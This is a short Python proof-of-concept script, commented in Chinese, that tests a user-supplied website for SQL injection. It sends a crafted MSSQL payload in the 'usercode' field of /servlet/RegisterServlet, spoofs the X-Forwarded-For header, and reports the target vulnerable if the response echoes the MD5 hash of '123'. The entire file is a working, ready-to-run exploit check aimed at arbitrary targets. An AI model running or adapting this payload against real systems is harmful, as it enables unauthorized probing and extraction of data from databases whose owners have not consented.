import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/servlet/RegisterServlet，参数是usercode',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/servlet/RegisterServlet"  # 移除末尾的斜杠
    else:
        url = args.url + "/servlet/RegisterServlet"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Forwarded-For': '127.0.0.1'
}

data = {
    'usercode': "1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123')),3,32)>0--"
}

response = requests.post(url, headers=headers, data=data)
if "202cb962ac59075b964b07152d234b70" in response.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)

